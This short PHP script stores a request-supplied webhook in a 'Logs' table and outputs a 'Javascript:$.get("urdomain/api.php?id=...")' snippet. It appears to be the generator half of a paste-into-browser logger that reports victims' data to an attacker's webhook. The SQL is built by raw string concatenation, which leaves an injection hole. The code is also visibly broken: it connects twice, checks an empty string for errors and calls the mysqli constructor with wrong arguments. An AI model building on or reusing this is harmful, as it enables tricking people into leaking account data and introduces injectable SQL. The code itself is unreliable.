<?php
$con = mysqli_connect('servername','username','password','dbname');
$webhook = $_REQUEST['webhook'];
$id = rand(10,343511);
// Create connection
$con = mysqli_connect('servername','username','password','dbname');
// Check connection
$conn ="";
/** @noinspection PhpUndefinedFieldInspection */
if ($conn->connect_error) {
    /** @noinspection PhpUndefinedFieldInspection */
    die("Connection failed: " . $conn->connect_error);
}

// sql to create table
/** @noinspection SqlNoDataSourceInspection */
$sql = "INSERT INTO Logs (ID, Webhook)
VALUES ('".$id."', '".$webhook."')";

$con=new mysqli("servername","username", "","password", "dbname");
  echo 'xJavascript:$.get("urdomain/api.php?id='.$id.'");

';